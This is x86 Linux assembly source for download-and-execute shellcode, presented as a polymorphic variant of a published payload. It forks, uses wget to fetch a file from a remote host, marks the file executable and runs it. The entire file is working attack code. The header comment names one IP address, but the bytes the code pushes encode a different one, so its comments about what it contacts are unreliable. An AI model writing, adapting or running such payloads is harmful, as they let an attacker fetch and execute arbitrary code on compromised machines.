; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/
; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes
; - polymorphic version by Henry <nc-nlvp.party>

global _start

section .text

_start:

;fork
    ;xor eax,eax
    ;mov al,0x2
    xor ebx,ebx
    push ebx
    push 0x78
    mov edi,esp;edi is the filename:x

    push 0x2
    pop eax
    int 0x80
    ;xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    ;xor eax,eax
    ;mov al,0x7
    push 0x7
    pop eax
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    mul ecx; make eax,edx to zero
    push eax
    mov al, 0xf
    ;push 0x78
    ;mov ebx, esp
    mov ebx,edi
    ;xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    ;;xor eax, eax
    ;push edx
    ;push 0x78
    ;mov ebx, esp
    mov ebx,edi
    push edx
    mov edx, esp
    push ebx
    mov ecx, esp
    ;mov al, 11
    push 11
    pop eax
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x782f2f33 ;x//3 avoid null byte
    push 0x322e3138 ;2.18
    push 0x2e303432 ;.042
    push 0x2e353331 ;.531
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80

